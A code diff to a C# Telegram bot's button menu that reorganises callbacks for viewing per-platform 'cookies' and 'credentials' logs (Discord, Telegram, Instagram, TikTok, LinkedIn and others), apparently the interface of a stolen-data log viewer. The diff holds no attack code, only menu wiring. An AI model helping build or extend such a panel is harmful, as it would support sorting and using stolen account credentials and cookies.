@@ -9,6 +9,18 @@ namespace Bot.Commands.Markups {
 						new KeyboardButtonCallback {
 							text = "Cookies",
 							data = $"user_cookies:{back_method}".Utf8()
+						},
+						new KeyboardButtonCallback {
+							text = "Credentials",
+							data = $"user_logs_show:0:user_credentials:{back_method}".Utf8()
+						}
+					]
+				},
+				new() {
+					buttons = [
+						new KeyboardButtonCallback {
+							text = "Telegram",
+							data = $"user_logs_show:0:user_telegram:{back_method}".Utf8()
 						}
 					]
 				},
@@ -19,8 +31,8 @@ namespace Bot.Commands.Markups {
 							data = $"user_logs_show:0:user_discord:{back_method}".Utf8()
 						},
 						new KeyboardButtonCallback {
-							text = "Credentials",
-							data = $"user_logs_show:0:user_credentials:{back_method}".Utf8()
+							text = "Twitch",
+							data = $"user_logs_show:0:user_twitch:{back_method}".Utf8()
 						}
 					]
 				}
@@ -42,23 +54,11 @@ namespace Bot.Commands.Markups {
 						buttons = [
 							new KeyboardButtonCallback {
 								text = "Instagram",
-								data = $"user_logs_show:0:user_instagram:user_cookies".Utf8()
+								data = $"user_logs_show:0:user_instagram:{back_method}".Utf8()
 							},
 							new KeyboardButtonCallback {
 								text = "Twitter",
-								data = $"user_logs_show:0:user_twitter:user_cookies".Utf8()
-							}
-						]
-					},
-					new() {
-						buttons = [
-							new KeyboardButtonCallback {
-								text = "Twitch",
-								data = $"user_logs_show:0:user_twitch:user_cookies".Utf8()
-							},
-							new KeyboardButtonCallback {
-								text = "Telegram",
-								data = $"user_logs_show:0:user_telegram:user_cookies".Utf8()
+								data = $"user_logs_show:0:user_twitter:{back_method}".Utf8()
 							}
 						]
 					},
@@ -66,11 +66,19 @@ namespace Bot.Commands.Markups {
 						buttons = [
 							new KeyboardButtonCallback {
 								text = "TikTok",
-								data = $"user_logs_show:0:user_tiktok:user_cookies".Utf8()
+								data = $"user_logs_show:0:user_tiktok:{back_method}".Utf8()
 							},
 							new KeyboardButtonCallback {
 								text = "YouTube",
-								data = $"user_logs_show:0:user_youtube:user_cookies".Utf8()
+								data = $"user_logs_show:0:user_youtube:{back_method}".Utf8()
+							}
+						]
+					},
+					new() {
+						buttons = [
+							new KeyboardButtonCallback {
+								text = "LinkedIn",
+								data = $"user_logs_show:0:user_linkedin:{back_method}".Utf8()
 							}
 						]
 					},
